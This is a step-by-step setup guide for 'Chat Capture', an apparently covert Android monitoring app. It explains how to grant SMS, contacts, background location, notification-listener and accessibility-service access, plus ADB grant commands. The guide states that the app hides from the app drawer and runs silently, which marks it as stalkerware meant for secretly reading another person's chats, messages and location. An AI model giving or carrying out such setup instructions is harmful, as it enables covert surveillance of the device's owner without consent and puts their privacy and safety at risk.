# Step-by-Step Guide: Granting All Permissions

## Overview
This guide provides detailed steps to grant all required permissions for the capture app. The app can be accessed via **Settings → Apps → [App Name]** (it's hidden from the app drawer).

## Quick Access Methods

### Method 1: Via Settings App
1. Open **Settings** app on your device
2. Go to **Apps** or **Application Manager**
3. Find and tap **Chat Capture** (or the app name)
4. Tap **Permissions** or go to the app's settings screen

### Method 2: Via ADB (For Testing)
```bash
adb shell am start -n com.chats.capture/.ui.MainActivity
```

### Method 3: Via Permission Setup Activity
The app automatically opens the permission setup screen on first install.

---

## Step-by-Step Permission Granting

### Phase 1: Runtime Permissions (System Dialogs)

These permissions are requested via system dialogs that appear automatically:

#### 1.1 Notification Permission (Android 13+)
- **When:** System dialog appears automatically
- **Action:** Tap **"Allow"** or **"Allow notifications"**
- **Status:** ✅ Enabled

#### 1.2 Media Permissions (Android 13+)
- **Images:** Tap **"Allow"** when prompted for photo access
- **Videos:** Tap **"Allow"** when prompted for video access
- **Audio:** Tap **"Allow"** when prompted for audio access
- **Status:** ✅ Enabled

#### 1.3 Contacts Permission
- **When:** System dialog appears
- **Action:** Tap **"Allow"** or **"Allow access to contacts"**
- **Status:** ✅ Enabled

#### 1.4 SMS Permission
- **When:** System dialog appears
- **Action:** Tap **"Allow"** or **"Allow access to SMS"**
- **Status:** ✅ Enabled

#### 1.5 Location Permissions
- **Fine Location:** Tap **"Allow"** when prompted
- **Coarse Location:** Tap **"Allow"** when prompted
- **Background Location:** Tap **"Allow"** when prompted (Android 10+)
- **Status:** ✅ Enabled

---

### Phase 2: Special Permissions (Settings-Based)

These require enabling in Android Settings. The app will open the correct Settings page automatically.

#### 2.1 Notification Access (CRITICAL)

**Steps:**
1. App opens: **Settings → Accessibility → Notification Access**
   - Or manually: Settings → Apps → Special Access → Notification Access
2. Find **"Chat Capture"** or the app name in the list
3. Toggle **ON** the switch next to the app
4. Confirm if prompted
5. Return to the app (it will detect automatically)

**Verification:**
- Status should show: ✅ **"Notification Access: Enabled"**

**If app doesn't open Settings automatically:**
- Go to: Settings → Apps → Special Access → Notification Access
- Enable the app manually

---

#### 2.2 Accessibility Service (CRITICAL)

**Steps:**
1. App opens: **Settings → Accessibility → Installed Services**
   - Or manually: Settings → Accessibility → Downloaded Apps
2. Find **"Chat Capture"** or the app name in the list
3. Tap on the app name
4. Toggle **ON** the switch at the top
5. Tap **"OK"** or **"Allow"** on the warning dialog
6. Return to the app (it will detect automatically)

**Verification:**
- Status should show: ✅ **"Accessibility Service: Enabled"**

**If app doesn't open Settings automatically:**
- Go to: Settings → Accessibility → Downloaded Apps (or Installed Services)
- Enable the app manually

---

#### 2.3 Usage Access Permission

**Steps:**
1. App opens: **Settings → Special Access → Usage Access**
   - Or manually: Settings → Apps → Special Access → Usage Access
2. Find **"Chat Capture"** or the app name in the list
3. Tap on the app name
4. Toggle **ON** the switch
5. Return to the app (it will detect automatically)

**Verification:**
- Status should show: ✅ **"Usage Access: Enabled"**

**If app doesn't open Settings automatically:**
- Go to: Settings → Apps → Special Access → Usage Access
- Enable the app manually

---

#### 2.4 Battery Optimization Exemption

**Steps:**
1. App opens: **Settings → Apps → Special Access → Battery Optimization**
   - Or manually: Settings → Battery → Battery Optimization
2. Find **"Chat Capture"** or the app name
3. Tap on the app name
4. Select **"Don't Optimize"** or **"Not Optimized"**
5. Tap **"Done"** or **"Allow"**
6. Return to the app (it will detect automatically)

**Verification:**
- Status should show: ✅ **"Battery Optimization: Ignored"**

**If app doesn't open Settings automatically:**
- Go to: Settings → Apps → Special Access → Battery Optimization
- Set app to "Don't Optimize"

---

#### 2.5 Auto-Start Permission (Manufacturer-Specific)

**Steps vary by manufacturer:**

**Samsung:**
1. Settings → Apps → Special Access → Autostart
2. Find **"Chat Capture"**
3. Toggle **ON**

**Xiaomi/MIUI:**
1. Settings → Apps → Manage Apps → Autostart
2. Find **"Chat Capture"**
3. Toggle **ON**

**Huawei/EMUI:**
1. Settings → Apps → Launch
2. Find **"Chat Capture"**
3. Toggle **ON**

**OnePlus/OxygenOS:**
1. Settings → Apps → Startup Manager
2. Find **"Chat Capture"**
3. Toggle **ON**

**Oppo/ColorOS:**
1. Settings → Apps → Startup Manager
2. Find **"Chat Capture"**
3. Toggle **ON**

**Vivo/FuntouchOS:**
1. Settings → Apps → Autostart
2. Find **"Chat Capture"**
3. Toggle **ON**

**Generic Android:**
- May not be available on all devices
- App will work without it, but may not auto-start after reboot

**Verification:**
- Status should show: ✅ **"Auto-Start: Enabled"**

---

### Phase 3: General App Permissions

#### 3.1 App Permissions (Runtime Permissions Summary)

**Steps:**
1. Go to: **Settings → Apps → [App Name] → Permissions**
2. Review all permissions:
   - ✅ **Notifications** - Enabled
   - ✅ **Storage** (Images/Videos/Audio) - Allowed
   - ✅ **Contacts** - Allowed
   - ✅ **SMS** - Allowed
   - ✅ **Location** - Allowed (All the time)
3. Enable any missing permissions

**Verification:**
- All permissions should show **"Allowed"** or **"Granted"**

---

## Complete Permission Checklist

Use this checklist to verify all permissions are granted:

### Runtime Permissions ✅
- [ ] Notifications (Android 13+)
- [ ] Images (Android 13+)
- [ ] Videos (Android 13+)
- [ ] Audio (Android 13+)
- [ ] Contacts
- [ ] SMS
- [ ] Fine Location
- [ ] Coarse Location
- [ ] Background Location (Android 10+)

### Special Permissions ✅
- [ ] Notification Access (Settings → Notification Access)
- [ ] Accessibility Service (Settings → Accessibility)
- [ ] Usage Access (Settings → Usage Access)
- [ ] Battery Optimization (Settings → Battery Optimization → Don't Optimize)
- [ ] Auto-Start (Manufacturer-specific settings)

---

## Using the Settings Screen (Single-Screen Permission Hub)

After initial setup, you can manage all permissions from the app's Settings screen:

### Access Settings Screen:
1. Open **Settings** app
2. Go to **Apps** → **[App Name]**
3. The app's settings screen will open automatically

### Permission Management:
Each permission shows:
- **Status:** ✅ Enabled / ❌ Disabled (with color coding)
- **Button:** "Enable" or "Manage" button
- **Action:** Tap button to open the relevant Settings page

### Permissions Available:
1. **Notification Access** - Opens Notification Access settings
2. **Accessibility Service** - Opens Accessibility settings
3. **Usage Access** - Opens Usage Access settings
4. **Battery Optimization** - Opens Battery Optimization settings
5. **Auto-Start** - Opens manufacturer-specific Auto-Start settings
6. **App Permissions** - Opens general app permissions

---

## Troubleshooting

### Permission Not Granting

**Issue:** System dialog doesn't appear
- **Solution:** Check if permission was already granted in Settings → Apps → [App Name] → Permissions

**Issue:** Settings page doesn't open
- **Solution:** Manually navigate to the Settings page using the paths provided above

**Issue:** Permission shows as denied after granting
- **Solution:** 
  1. Go to Settings → Apps → [App Name] → Permissions
  2. Revoke the permission
  3. Return to app and grant again

### Special Permission Not Detected

**Issue:** Notification Access not detected
- **Solution:**
  1. Go to Settings → Apps → Special Access → Notification Access
  2. Disable the app
  3. Re-enable the app
  4. Return to app

**Issue:** Accessibility Service not detected
- **Solution:**
  1. Go to Settings → Accessibility → Downloaded Apps
  2. Disable the service
  3. Re-enable the service
  4. Return to app

### Battery Optimization Keeps Resetting

**Issue:** Battery optimization keeps getting re-enabled
- **Solution:**
  1. Go to Settings → Battery → Battery Optimization
  2. Find the app
  3. Set to "Don't Optimize"
  4. Some devices require additional confirmation

---

## ADB Commands for Testing

### Check Permission Status:
```bash
# Check notification access
adb shell settings get secure enabled_notification_listeners

# Check accessibility services
adb shell settings get secure enabled_accessibility_services

# Check usage access
adb shell dumpsys usagestats | grep -A 5 "com.chats.capture"

# Check battery optimization
adb shell dumpsys deviceidle | grep -A 5 "com.chats.capture"
```

### Grant Permissions via ADB:
```bash
# Grant runtime permissions
adb shell pm grant com.chats.capture android.permission.READ_CONTACTS
adb shell pm grant com.chats.capture android.permission.READ_SMS
adb shell pm grant com.chats.capture android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.chats.capture android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.chats.capture android.permission.READ_MEDIA_IMAGES
adb shell pm grant com.chats.capture android.permission.READ_MEDIA_VIDEO
adb shell pm grant com.chats.capture android.permission.READ_MEDIA_AUDIO

# Note: Special permissions (Notification Access, Accessibility) cannot be granted via ADB
# They must be enabled manually in Settings
```

---

## Verification Steps

### 1. Check Permission Status in App
- Open app Settings screen
- Review all permission statuses
- All should show ✅ **Enabled**

### 2. Check via ADB
```bash
# Check if notification service is enabled
adb shell settings get secure enabled_notification_listeners | grep com.chats.capture

# Check if accessibility service is enabled
adb shell settings get secure enabled_accessibility_services | grep com.chats.capture
```

### 3. Check Logcat
```bash
adb logcat -s PermissionChecker:D
```

Look for:
- `Notification service enabled: true`
- `Accessibility service enabled: true`
- `Battery optimization ignored: true`

---

## Quick Reference: Settings Paths

| Permission | Settings Path |
|------------|---------------|
| **Notification Access** | Settings → Apps → Special Access → Notification Access |
| **Accessibility Service** | Settings → Accessibility → Downloaded Apps |
| **Usage Access** | Settings → Apps → Special Access → Usage Access |
| **Battery Optimization** | Settings → Apps → Special Access → Battery Optimization |
| **Auto-Start** | Settings → Apps → [Manufacturer-specific] |
| **App Permissions** | Settings → Apps → [App Name] → Permissions |

---

## Important Notes

1. **App is Hidden:** The app doesn't appear in the app drawer. Access it via Settings → Apps → [App Name]

2. **Silent Operation:** The app operates silently - no notifications or alerts during permission setup

3. **Read-Only:** All permissions are read-only. The app does NOT:
   - Modify or delete files
   - Send messages
   - Block notifications
   - Interfere with other apps

4. **Graceful Degradation:** The app will work with partial permissions, but full functionality requires all permissions

5. **Automatic Detection:** After granting permissions in Settings, return to the app - it will automatically detect the changes

---

## Support

If you encounter issues granting permissions:

1. **Check logcat:** `adb logcat -s PermissionChecker:D`
2. **Verify app is installed:** `adb shell pm list packages | grep com.chats.capture`
3. **Check app status:** Use the "Check Installation Status" button in Settings
4. **Review documentation:** See `PERMISSIONS_DOCUMENTATION.md` for detailed permission information

---

## Summary

**Total Permissions:** 14+
- **Runtime Permissions:** 9 (system dialogs)
- **Special Permissions:** 5 (Settings-based)

**Estimated Time:** 5-10 minutes for complete setup

**Difficulty:** Easy - Follow the guided flow or use the Settings screen

The app provides a smooth, step-by-step permission setup process with automatic progression and clear guidance for each permission.
